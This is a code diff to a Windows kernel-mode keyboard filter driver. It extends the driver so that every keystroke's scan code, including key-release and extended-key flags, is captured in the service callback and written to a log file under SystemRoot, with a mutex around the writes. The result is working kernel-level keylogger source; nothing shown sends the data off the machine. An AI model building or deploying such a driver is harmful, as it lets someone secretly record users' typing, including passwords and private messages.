@@ -182,6 +182,8 @@ FilterEvtIoInternalDeviceControl(
             NT_ASSERT(length == InputBufferLength);
 
             filterExt->UpperConnectData = *connectData;
+            
+            ExInitializeFastMutex(&filterExt->FastMutex);
 
             //
             // Hook into the report chain.  Everytime a keyboard packet is reported
@@ -236,20 +238,35 @@ FilterServiceCallback(
     WDFDEVICE           device;
 
     KdPrint(("Keyboard filter: FilterServiceCallback\n"));
-    KdPrint(("MakeCode: %hu\n", InputDataStart->MakeCode));
+    KdPrint(("MakeCode: 0x%hx\n", InputDataStart->MakeCode));
+
+    device = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
+
+    filterExt = FilterGetData(device);
 
     PWORKER_DATA data = (PWORKER_DATA)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(WORKER_DATA), 0x64657246);
     if (data) {
         data->Item = IoAllocateWorkItem(DeviceObject);
-        IoQueueWorkItem(data->Item, WriteMakeCodeToFile, DelayedWorkQueue, data);
+        USHORT ScanCode = InputDataStart->MakeCode;
+        ScanCode &= 0x00FF;
+        if (InputDataStart->Flags & KEY_BREAK) {
+            ScanCode |= 0x0080;
+        }
+        if ((InputDataStart->Flags & KEY_E0) != 0) {
+            ScanCode |= 0xE000;
+        }
+        if ((InputDataStart->Flags & KEY_E1) != 0) {
+            ScanCode |= 0xE100;
+        }
+
+        data->ScanCode = ScanCode;
+        data->FastMutex = &filterExt->FastMutex;
+        IoQueueWorkItem(data->Item, WriteMakeCodeToFile, NormalWorkQueue, data);
     }
     else {
         KdPrint(("Could not allocate memory with ExAllocatePool2"));
     }
 
-    device = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
-
-    filterExt = FilterGetData(device);
 
     (*(PSERVICE_CALLBACK_ROUTINE)(ULONG_PTR)filterExt->UpperConnectData.ClassService)(
         filterExt->UpperConnectData.ClassDeviceObject,
@@ -296,11 +313,22 @@ VOID WriteMakeCodeToFile(IN PDEVICE_OBJECT DeviceObject, IN PWORKER_DATA Context
     IO_STATUS_BLOCK ioStatusBlock;
     NTSTATUS ntstatus = STATUS_SUCCESS;
     UNICODE_STRING uc;
-    RtlInitUnicodeString(&uc, L"\\SystemRoot\\LOGGER\\logs.txt");
+    RtlInitUnicodeString(&uc, L"\\SystemRoot\\LOGGER\\logs");
+
+    USHORT ScanCode = Context->ScanCode;
+    UCHAR     buffer[2];
+    buffer[0] = (ScanCode & 255);
+    KdPrint(("Buffer[0]: 0x%x\n", (int) buffer[0]));
+    buffer[1] = (ScanCode >> 8);
+    KdPrint(("Buffer[1]: 0x%x\n", (int)buffer[1]));
+    size_t  cb = 2;
+
+    ExAcquireFastMutex(Context->FastMutex);
+    KdPrint(("AcquiredFastMutex\n"));
 
     InitializeObjectAttributes(&objAttr, 
         &uc,
-        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+        OBJ_KERNEL_HANDLE,
         NULL, 
         NULL);
 
@@ -316,18 +344,13 @@ VOID WriteMakeCodeToFile(IN PDEVICE_OBJECT DeviceObject, IN PWORKER_DATA Context
 
     if (!NT_SUCCESS(ntstatus)) {
         KdPrint(("ZwCreateFile failed\n"));
+        KdPrint(("ReleasingFastMutex\n"));
+        ExReleaseFastMutex(Context->FastMutex);
         return;
     }
-    
+
     KdPrint(("Opened file: %wZ\n", uc));
-    CHAR     buffer[2] = "A";
-    size_t  cb = 1;
-    /*ntstatus = RtlStringCbLengthA(buffer, sizeof(buffer), &cb);
-    if (!NT_SUCCESS(ntstatus)) {
-        KdPrint(("RtlStringCbLengthA failed"));
-        ZwClose(fileHandle);
-        return;
-    }*/
+
     #pragma warning(disable:4267)  //size_t to ULONG cast
     ntstatus = ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock,
         buffer, cb, NULL, NULL);
@@ -337,9 +360,10 @@ VOID WriteMakeCodeToFile(IN PDEVICE_OBJECT DeviceObject, IN PWORKER_DATA Context
     }
 
     ZwClose(fileHandle);
+    KdPrint(("ReleasingFastMutex\n"));
+    ExReleaseFastMutex(Context->FastMutex);
     
     UNREFERENCED_PARAMETER(DeviceObject);
-    //UNREFERENCED_PARAMETER(Context);
     IoFreeWorkItem(Context->Item);
     ExFreePool(Context);
 }
